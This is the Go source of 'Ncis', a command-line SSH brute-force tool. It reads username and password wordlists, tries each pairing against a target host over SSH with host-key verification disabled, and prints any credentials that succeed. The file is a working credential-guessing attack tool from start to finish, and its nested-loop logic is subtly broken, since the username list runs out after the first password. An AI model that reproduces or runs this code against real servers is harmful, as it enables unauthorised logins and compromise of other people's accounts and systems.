package main

import (
	"bufio"
	"fmt"
	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
	"os"
	"strings"
)

var (
	version = "dev"
	helpMsg = `Ncis - Brute force ssh super fast

Usage: ncis <target IP> <user list> <password list>
       ncis [-v/--version | -h/--help]
   <target IP>     : the address to ssh into
   <user list>     : path to file with usernames on each line
   <password list> : path to file with passwords on each line`
)

func main() {
	// TODO: get wordlists from env vars so user does not have to type/remember paths
	if len(os.Args) > 4 {
		handleErrStr("too many arguments (>3)") // will accept ip addr, pass list and user list
		fmt.Println(helpMsg)
		return
	}
	if len(os.Args) == 1 {
		fmt.Println(helpMsg)
		return
	}
	if hasOption, _ := argsHaveOption("help", "h"); hasOption {
		fmt.Println(helpMsg)
		return
	}
	if hasOption, _ := argsHaveOption("version", "v"); hasOption {
		fmt.Println("Ncis " + version)
		return
	}
	userFile, err := os.Open(os.Args[2])
	if err != nil {
		handleErr(err)
		return
	}
	passFile, err := os.Open(os.Args[3])
	if err != nil {
		handleErr(err)
		return
	}
	bruteForceSSH(os.Args[1], userFile, passFile)
}

func bruteForceSSH(target string, userFile *os.File, passFile *os.File) {
	if !strings.Contains(target, ":") {
		target += ":22"
	}
	userFileScanner := bufio.NewScanner(userFile)
	passFileScanner := bufio.NewScanner(passFile)

	for passFileScanner.Scan() {
		password := passFileScanner.Text()
		for userFileScanner.Scan() {
			user := userFileScanner.Text()
			config := &ssh.ClientConfig{
				User: user,
				Auth: []ssh.AuthMethod{
					ssh.Password(password),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			}
			_, err := ssh.Dial("tcp", target, config)
			if err == nil {
				fmt.Println(color.HiGreenString("Found credentials: ") + user + ":" + password)
				return
			} else {
				fmt.Println(color.YellowString("Failed attempt: ") + user + ":" + password)
			}
		}
		if err := userFileScanner.Err(); err != nil {
			handleErr(err)
			continue
		}
	}
	if err := passFileScanner.Err(); err != nil {
		handleErr(err)
		return
	}
}

func argsHaveOption(long string, short string) (hasOption bool, foundAt int) {
	for i, arg := range os.Args {
		if arg == "--"+long || arg == "-"+short {
			return true, i
		}
	}
	return false, 0
}

func handleErr(err error) {
	handleErrStr(err.Error())
}

func handleErrStr(str string) {
	_, _ = fmt.Fprintln(os.Stderr, color.RedString("error: ")+str)
}
